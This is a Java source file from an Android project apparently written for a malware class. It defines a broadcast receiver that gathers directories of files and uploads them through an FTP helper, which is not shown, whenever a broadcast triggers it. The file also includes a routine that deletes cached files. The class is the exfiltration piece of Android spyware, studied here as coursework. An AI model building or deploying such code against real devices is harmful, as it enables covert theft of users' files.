package com.malwareclass.malwareproject;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

import java.io.File;
import java.util.HashMap;
import java.util.Set;


public class UploadData extends BroadcastReceiver{
    private static UploadData instance;
    private Context context;
    HashMap<String, File[]> data = null;
    private static final String TAG = "UPLOAD";

    public UploadData(){

    }

    private UploadData(Context context){
        this.context = context;
        data = new HashMap<>();
    }

    public static UploadData getIstance(Context context){
        if(instance == null)
            instance = new UploadData(context);
        return instance;
    }


    public boolean addFile(String dir, File[] file){
        return data.put(dir, file) != null;
    }

    public void upload() {
        if (!data.isEmpty()) {
            //Log.d(TAG, "uploading...");
            new FTP(context).upload(data);
        }
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        //Log.d(TAG, "Started");
        getIstance(context).upload();
        //getIstance(context).cleanCacheDir();
    }

    private void cleanCacheDir(){
        File[] dir = context.getCacheDir().listFiles();
        if(dir !=null)
            for(File file: dir)
                file.delete();
    }
}
